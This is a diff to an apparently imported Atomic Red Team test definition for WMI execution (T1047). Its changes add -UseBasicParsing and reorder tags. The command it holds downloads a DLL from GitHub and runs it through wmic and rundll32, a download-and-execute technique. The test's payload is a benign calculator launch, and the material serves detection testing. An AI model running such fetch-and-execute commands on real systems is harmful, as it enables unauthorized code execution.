@@ -12,8 +12,8 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\calc.dll")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\calc.dll"; fi; wmic /node:127.0.0.1
-          process call create "rundll32.exe \"PathToAtomicsFolder\..\ExternalPayloads\calc.dll\"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\calc.dll" -UseBasicParsing;
+          fi; wmic /node:127.0.0.1 process call create "rundll32.exe \"PathToAtomicsFolder\..\ExternalPayloads\calc.dll\"
           StartW"'
         cleanup: taskkill /f /im calculator.exe
   plugin: atomic
@@ -22,9 +22,9 @@
   delete_payload: false
   privilege: ''
   buckets:
+  - execution
   - t1047
   - atomic-red-team
-  - execution
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -50,9 +50,9 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true"
-        -OutFile "#{dll_to_execute}"
+        -OutFile "#{dll_to_execute}" -UseBasicParsing
 
         '
     technique_created: '2017-05-31T21:30:44.329Z'
     atomic_guid: 00738d2a-4651-4d76-adf2-c43a41dfb243
-    import_timestamp: '2026-10-20T07:08:27.665604Z'
+    import_timestamp: '2026-10-21T07:01:50.278037Z'
